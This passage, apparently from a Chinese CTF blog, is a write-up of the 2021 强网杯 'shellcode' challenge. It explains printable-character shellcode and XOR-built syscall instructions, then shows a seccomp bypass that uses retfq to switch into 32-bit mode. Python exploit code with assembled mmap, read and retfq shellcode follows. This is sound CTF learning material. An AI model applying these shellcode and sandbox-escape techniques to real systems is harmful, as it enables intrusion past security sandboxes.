<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/" class="post-title-link" itemprop="url">2021强网杯-shellcode</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-13 16:01:42 / 修改时间：21:04:27" itemprop="dateCreated datePublished" datetime="2022-03-13T16:01:42+08:00">2022-03-13</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这题涉及的知识点比较多</p>
<h4 id="可见字符范围内的shellcode构造。"><a href="#可见字符范围内的shellcode构造。" class="headerlink" title="可见字符范围内的shellcode构造。"></a>可见字符范围内的shellcode构造。</h4><img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-1.png" class>

<p>一些shellcode的题目中存在这样的检查，如果输入不在限制的范围内则直接退出，通过检查则执行我们的输入，所以我们只能在限制的范围内构造出实现我们想要功能的shellcode</p>
<p>可用的汇编指令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">1.数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line">2.算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">3.逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">4.比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">5.转移指令:</span><br><span class="line">push 56h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, 43h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line">6.交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">xor byte ptr [esp], ah // al ^= ah</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line">7.清零:</span><br><span class="line">push 44h</span><br><span class="line">pop eax</span><br><span class="line">sub al, 44h ; eax = 0</span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = 0</span><br></pre></td></tr></table></figure>

<p>同时因为x86中的<code>int 0x80</code>和x64中的<code>syscall</code>指令也在不可见字符范围中，所以我们不能直接输入，要通过<code>xor and sub inc dec</code>这样的算术运算来使得一些shellcode操作后变成<code>int 0x80</code>或<code>syscall</code></p>
<p>异或构造<code>syscall</code>：<code>syscall</code>的机器码对应的16进制为<code>0F 05</code>，<code>push rdx;pop rdx;</code>的机器码对应的16进制分别为<code>0x52</code>和<code>0x5a</code>，分别用<code>0x5d</code>和<code>0x5f</code>去异或即可得到<code>0F 05</code>，如下：</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-2.png" class>

<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>

<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>

<p>从<code>0x7f5031b3601d</code>处开始到<code>0x7f5031b36026</code>，一共执行完的两步异或使得原本在<code>[rax+0x31]</code>和<code>[rax+0x32]</code>处的指令<code>push rdx;pop rdx;</code>变成了指令<code>syscall</code></p>
<h4 id="retfq指令"><a href="#retfq指令" class="headerlink" title="retfq指令"></a>retfq指令</h4><p>程序通过cs寄存器来确定以64/32位模式来运行，<code>cs = 0x23</code>对应32位模式，<code>cs = 0x33</code>对应64位模式，而retfq则是用来修改cs寄存器的，其功能相当于<code>ret;pop cs</code>。</p>
<p>更详细的可以搜索这个指令的相关或者<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645">shellcode 的艺术</a></p>
<h4 id="绕过沙箱"><a href="#绕过沙箱" class="headerlink" title="绕过沙箱"></a>绕过沙箱</h4><p>当沙箱的第一行是<code>A = sys_number</code>时，我们可以通过切换程序运行的位数来调用到在另一个位数中相同调用号的函数。如下图中，程序正常时工作在64位模式下，则这个沙箱过滤的就是64位下这些函数的系统调用号，也就是只允许调用<code>5（fstat）、37（alarm）、0（read）、9（mmap）、231（exit_group）</code>这几个系统调用，但是这里沙箱是只允许调用这些<strong>调用号</strong>，而不是只允许调用这些<strong>函数</strong>，同时我们知道32位和64位下的系统调用号对应的是不同的函数，例如64位中5号系统调用对应的是fstat函数，但是32位中5号系统调用对应的是open函数。所以我们有时就能通过切换程序工作位数的方法来调用到一些沙箱原本过滤掉的函数。</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class>

<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>保护</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/checksec.jpg" class>

<p>沙箱如下</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/seccomp.jpg" class>

<p>程序主逻辑如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 arg3[<span class="number">2</span>]; <span class="comment">// [rsp+80h] [rbp-80h] BYREF</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+90h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+92h] [rbp-6Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+93h] [rbp-6Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+94h] [rbp-6Ch]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+98h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+9Ah] [rbp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+9Bh] [rbp-65h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+9Ch] [rbp-64h]</span></span><br><span class="line">  __int16 v18; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+A2h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+A3h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+A4h] [rbp-5Ch]</span></span><br><span class="line">  __int16 v22; <span class="comment">// [rsp+A8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+AAh] [rbp-56h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+ABh] [rbp-55h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+ACh] [rbp-54h]</span></span><br><span class="line">  __int16 v26; <span class="comment">// [rsp+B0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+B2h] [rbp-4Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [rsp+B3h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+B4h] [rbp-4Ch]</span></span><br><span class="line">  __int16 v30; <span class="comment">// [rsp+B8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+BAh] [rbp-46h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [rsp+BBh] [rbp-45h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+BCh] [rbp-44h]</span></span><br><span class="line">  __int16 v34; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [rsp+C2h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [rsp+C3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [rsp+C4h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v38; <span class="comment">// [rsp+C8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [rsp+CAh] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [rsp+CBh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [rsp+CCh] [rbp-34h]</span></span><br><span class="line">  __int16 v42; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+D2h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [rsp+D3h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [rsp+D4h] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">32</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">21</span>;</span><br><span class="line">  v15 = <span class="number">6</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">5</span>;</span><br><span class="line">  v18 = <span class="number">21</span>;</span><br><span class="line">  v19 = <span class="number">5</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">37</span>;</span><br><span class="line">  v22 = <span class="number">21</span>;</span><br><span class="line">  v23 = <span class="number">3</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">4</span>;</span><br><span class="line">  v26 = <span class="number">21</span>;</span><br><span class="line">  v27 = <span class="number">3</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">21</span>;</span><br><span class="line">  v31 = <span class="number">2</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">9</span>;</span><br><span class="line">  v34 = <span class="number">21</span>;</span><br><span class="line">  v35 = <span class="number">1</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">231</span>;</span><br><span class="line">  v38 = <span class="number">6</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">6</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(arg3[<span class="number">0</span>]) = <span class="number">9</span>;</span><br><span class="line">  arg3[<span class="number">1</span>] = &amp;v10;</span><br><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, arg3, v2);</span><br><span class="line">  v4 = sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v5 = sys_read(<span class="number">0</span>, v4, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v4[v5 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v6 = v5 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] &lt;= <span class="number">31</span> || v4[i] == <span class="number">127</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  (v4)();	<span class="comment">//这里call rbx</span></span><br><span class="line">LABEL_10:</span><br><span class="line">  v8 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序逻辑很简单，先mmap一段rwx的内存，然后往这段内存中输入，程序检查我们的输入是否在<code>&gt;31 &amp;&amp; &lt;127</code>的范围内，如果不在则直接退出，如果检查通过则直接执行。</p>
<p>显然这是一道构造shellcode的题目，虽然我们可以通过alpha3和ae64等工具直接构造出符合条件的shellcode，但是显然因为沙箱的存在，所以我们需要手动构造。</p>
<p>沙箱只允许我们调用几个函数，可见其中我们可以利用的只有read，没有输出函数我们可以通过侧信道攻击爆破出shellcode，但是我们需要先解决连open都没有的问题。这时就要利用绕过沙箱的技巧，因为沙箱中的第一个函数fstat的调用号是5，而32位中5号系统调用对应open函数，所以只要我们将程序切换到32位模式下，就可以调用open函数了，然后再切换回来read和爆破即可。</p>
<p>但是因为retfq指令会先ret，同时ret之后程序按照32位模式来对齐地址和执行指令，所以在原本的64位模式下的地址中执行指令会出错，所以我们还先应该mmap一段固定的地址，来给32位的指令预留位置，mmap完之后调用read将我们的x86open和再次切换回64位的retfq指令写进这个地址中，完成后在retfq的同时跳转到这个地址执行。（因为32位模式下我们调用不了read，所以我们open完之后仍然需要返回到64位将flag写出来）</p>
<p>接下来编写可见字符范围内的read和mmap，在尝试构造的过程中，如果程序是这样的</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-1.jpg" class>

<p>则说明我们的输入通过了检查，因为程序是异常退出的，但如果是这样的</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-2.jpg" class>

<p>则说明我们的输入没有通过检查，因为程序是调用exit_group正常退出的</p>
<p>mmap需要按照这样调用：<code>mmap(0x40404040,0x7e,7,34,0,0)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push rdx</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x7e</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    sub al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x2f],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x30],cl</span></span><br><span class="line"><span class="string">    /* set rcx */</span></span><br><span class="line"><span class="string">    push 0x22</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    /* set r8 */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    /* set r9 */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x49</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x52],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x53],cl</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  push rbx</span></span><br><span class="line"><span class="string">  pop rax</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  xor al,0x40</span></span><br><span class="line"><span class="string">  push 0x72</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x68</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x47</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x48</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x23</span></span><br><span class="line"><span class="string">  push 0x40404040</span></span><br><span class="line"><span class="string"> &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_mmap + append + shellcode_read + append + shellcode_retfq + append</span><br><span class="line">p.send(asm(payload))</span><br></pre></td></tr></table></figure>

